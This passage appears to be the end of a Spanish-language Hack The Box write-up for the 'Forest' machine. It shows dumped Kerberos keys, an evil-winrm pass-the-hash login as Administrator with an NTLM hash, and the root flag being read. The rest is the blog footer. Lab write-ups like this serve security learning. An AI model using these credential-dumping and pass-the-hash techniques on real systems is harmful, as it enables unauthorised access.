+miguel:aes256-cts-hmac-sha1-96:c082f34484cf7a8c4fafed3cb3fab456551438f400e8a836fe30e9a3a2b3a198
+miguel:aes128-cts-hmac-sha1-96:0a35c924365ab52d452d8888e8406463
+miguel:des-cbc-md5:ad2967864f0ba4ab
+FOREST<span class="nv">$:</span>aes256-cts-hmac-sha1-96:04af0b7895e8e4203acc82fd2b98f3084ca35e75977c18481fe386a6b43dd74f
+FOREST<span class="nv">$:</span>aes128-cts-hmac-sha1-96:77d766d46c2c692a2c9e0e16fb4d22ce
+FOREST<span class="nv">$:</span>des-cbc-md5:c8132fbf73c71fa8
+EXCH01<span class="nv">$:</span>aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
+EXCH01<span class="nv">$:</span>aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
+EXCH01<span class="nv">$:</span>des-cbc-md5:8c45f44c16975129
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up... 
+</code></pre></div></div>
+
+<h2 id="root-flag--shell-as-administrator">Root flag &amp;&amp; Shell as Administrator</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> Administrator <span class="nt">-H</span> 32693b11e6aa90eb43d32c72a07ceea6
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt; <span class="nb">cd </span>Desktop
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>root.txt
+22123ef2e8b61fe523663bcbb7f231e8
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; 
+</code></pre></div></div>
+
+
+  </div><a class="u-url" href="/hackthebox/machines/easy/2024/04/02/forest.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
